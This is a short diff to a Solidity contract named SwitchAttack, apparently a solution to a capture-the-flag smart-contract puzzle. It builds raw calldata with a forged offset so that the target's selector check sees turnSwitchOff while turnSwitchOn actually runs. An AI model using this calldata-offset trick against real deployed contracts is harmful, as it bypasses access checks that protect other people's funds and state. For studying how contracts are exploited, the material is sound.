@@ -15,9 +15,17 @@ contract SwitchAttack {
     }
 
     function attack() external {
-        bytes4 selector = bytes4(keccak256("turnSwitchOn()"));
-        bytes memory callData = abi.encodeWithSelector(selector, "");
+        (bool ok, ) = switchAddress.call(
+            abi.encodePacked(
+                Switch.flipSwitch.selector,         // flipSwitch Selector (4 bytes)
+                abi.encode(96),                     // Calldata offset (32 bytes)
+                abi.encode(0x00),                   // DUMMY (32 bytes)
+                abi.encode(Switch.turnSwitchOff.selector),      // turnSwitchOff Selector (4 bytes)
+                abi.encode(4),                      // Real size of data (32 bytes)
+                abi.encodeWithSelector(Switch.turnSwitchOn.selector)    // Calldata (4 bytes)
+            )
+        );
 
-        Switch(switchAddress).flipSwitch(callData);
+        require(ok);
     }
 }
